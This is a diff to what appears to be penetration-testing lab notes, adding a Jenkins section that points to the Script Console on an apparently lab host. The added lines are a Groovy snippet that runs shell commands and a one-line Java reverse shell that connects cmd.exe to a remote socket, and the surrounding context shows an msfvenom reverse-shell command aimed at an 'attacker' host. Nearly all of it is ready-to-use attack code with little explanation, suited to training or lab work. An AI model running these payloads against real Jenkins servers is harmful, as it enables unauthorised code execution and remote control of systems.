@@ -198,6 +198,21 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war > shell.
 ### Jenkins
 
 **What to Look For**
+http://jenkins.inlanefreight.local:8000/configureSecurity/
+
+http://jenkins.inlanefreight.local:8000/script
+def cmd = 'ls /var/lib/jenkins3'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+
+or windows
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 * Anonymous access
 * Script Console (`/script`)
